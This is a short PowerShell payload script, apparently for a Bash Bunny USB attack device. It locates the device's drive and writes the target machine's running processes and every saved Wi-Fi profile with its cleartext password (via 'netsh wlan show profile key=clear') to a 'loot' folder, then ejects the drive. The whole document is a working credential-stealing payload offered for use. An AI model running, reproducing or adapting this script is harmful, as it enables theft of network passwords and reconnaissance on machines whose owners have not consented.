$bb = (gwmi win32_volume -f 'label=''DJBUNNY''').Name

# Gets currently running processes
Get-Process | Out-File $bb\loot\Slydoor\loot_process.txt -Encoding ASCII
echo "+ PSP: 'Get-Process' logged to loot_process.txt" | Out-File $bb\logs\Slydoor.log -Append -Encoding ASCII

# Gets WLAN details
$output = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches | % {$_.Groups[1].Value.Trim()}; $_} |%{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches | % {$_.Groups[1].Value.Trim()}; $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize
$output | Out-File $bb\loot\Slydoor\loot_wlan.txt -Encoding ASCII
echo "+ PSP: 'Get-WLAN' logged to loot_wlan.txt" | Out-File $bb\logs\Slydoor.log -Append -Encoding ASCII

# Tell the BB that we've finished and eject the BB
echo "+ Powershell payload complete" | Out-File $bb\logs\Slydoor.log -Append -Encoding ASCII
$driveEject = New-Object -comObject Shell.Application
$driveEject.Namespace(17).ParseName("$bb").InvokeVerb("Eject")